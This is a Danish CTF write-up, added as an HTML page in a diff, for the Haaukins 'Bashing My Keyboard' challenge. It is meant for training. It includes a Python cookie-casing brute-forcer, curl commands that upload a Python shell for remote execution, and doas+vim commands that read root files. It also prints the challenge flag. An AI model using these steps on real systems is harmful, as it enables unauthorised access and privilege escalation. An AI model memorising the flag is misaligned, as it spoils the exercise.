@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Bashing My Keyboard — tutorial (dødt JS-kode afslører cookie-gate og RCE, vim+doas giver root)</title>
+<meta name="description" content="Guide til Haaukins Bashing My Keyboard: en kommenteret JS-funktion afslører både at uploadede .py-filer køres som script, og en case-sensitiv cookie-gate til uploadet; brute-force cookien, få RCE, og brug doas+vim til root.">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/bashing-my-keyboard.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: Bashing My Keyboard — tutorial (dødt JS-kode afslører cookie-gate og RCE, vim+doas giver root)">
+<meta property="og:description" content="Guide til Haaukins Bashing My Keyboard: en kommenteret JS-funktion afslører både at uploadede .py-filer køres som script, og en case-sensitiv cookie-gate til uploadet; brute-force cookien, få RCE, og brug doas+vim til root.">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/bashing-my-keyboard.html">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Bashing My Keyboard", "description": "Guide til Haaukins Bashing My Keyboard: en kommenteret JS-funktion afslører både at uploadede .py-filer køres som script, og en case-sensitiv cookie-gate til uploadet; brute-force cookien, få RCE, og brug doas+vim til root.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/bashing-my-keyboard.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Bashing My Keyboard</h1>
+<p class="subtitle">Udviklerens egen outkommenterede kode fortæller dig hele angrebsplanen.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Læs det døde kode i kommentaren</h2>
+<p><code>http://keyboard-bashing.hkn</code> er en fil-upload-side. <code>/static/js/upload.js</code>
+             har en hel funktion pakket i en kommentar:</p>
+             <pre><code>// Implement this properly. For now using flask backend, it only runs python files!!!!
+/*
+function uploadFile() {
+    // It was some variation of letter cases on bruhbruh, but idk man
+    if (document.cookie.includes('admin=okaaaayletsgo')) {
+        fetch('/upload', { method: 'POST', body: formData })
+    }
+}
+*/</code></pre>
+             <p>To ting afsløres direkte: (1) backend kører uploadede <code>.py</code>-filer som
+             Python-script ved besøg på <code>/uploads/&lt;filnavn&gt;</code>, og (2) upload kræver en
+             cookie <code>admin=&lt;case-variant af "okaaaayletsgo"&gt;</code> — kommentaren indrømmer
+             selv at store/små bogstaver er "tilfældige".</p>
+<h2>Brute-force cookie-casingen</h2>
+<p>13 tegn → 2¹³ = 8192 mulige store/små-bogstav-kombinationer. Trivielt at
+             brute-force:</p>
+             <pre><code>def gen_variants(s):
+    n = len(s)
+    for bits in range(2**n):
+        yield "".join(c.upper() if bits &amp; (1&lt;&lt;i) else c.lower() for i,c in enumerate(s))
+
+for variant in gen_variants("okaaaayletsgo"):
+    r = requests.post(URL, files=files, cookies={"admin": variant})
+    if "Only admin" not in r.text:
+        print("FOUND:", variant)   # oKaaAAYleTSgo</code></pre>
+<h2>RCE og privesc via doas+vim</h2>
+<pre><code>curl http://keyboard-bashing.hkn/ -F "file=@shell.py" -b "admin=oKaaAAYleTSgo"
+curl http://keyboard-bashing.hkn/uploads/shell.py     # kører scriptet, viser stdout</code></pre>
+             <p>Shell kører som <code>brian</code>.</p>
+             <pre><code>find / -perm -4000 -type f 2&gt;/dev/null
+# ... /usr/bin/doas   &lt;- SUID, OpenBSD-style sudo-erstatning
+cat /etc/doas.conf
+# permit nopass brian as root cmd vim</code></pre>
+             <p>Klassisk GTFOBins vim→shell, men da vi kun har en upload-baseret RCE (ingen interaktiv
+             pty), bruges vims <code>:!</code>-escape til at køre en shell-kommando og omdirigere output
+             til en fil, som læses tilbage ikke-root:</p>
+             <pre><code>subprocess.run(["doas","vim","-es",
+    "-c", "!ls -la /root &gt; /tmp/out.txt; cat /root/*.txt /root/*flag* &gt;&gt; /tmp/out.txt 2&gt;&amp;1",
+    "-c", "qa!"])</code></pre>
+             <p><code>vim -es</code> = "ex silent mode" — kører som batch-script uden interaktiv UI,
+             nødvendigt når du ikke har en pty over en HTTP-uploadet RCE. <code>/root/flag.txt</code> var
+             verdens-læsbar, så den sidste <code>cat</code>-del afslører flaget direkte.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag (bemærk det usædvanlige præfiks <strong>HNK{</strong>, ikke HKN{} — formentlig et
+        ordspil på keyBoARD-temaet, eller en bevidst tastefejl): <span class="flag">HNK{w3w_7h47_700k_qu173_4_7urn}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Dødt kode i en JS-kommentar er stadig ægte kildekode-læk — læs det, selv når det ser "outkommenteret væk" ud.</li><li>En case-sensitiv 13-tegns cookie er kun 8192 muligheder — altid værd at brute-force frem for at gætte.</li><li>vim -es ("ex silent mode") lader dig køre shell-kommandoer via en upload-baseret RCE uden at have en interaktiv pty.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
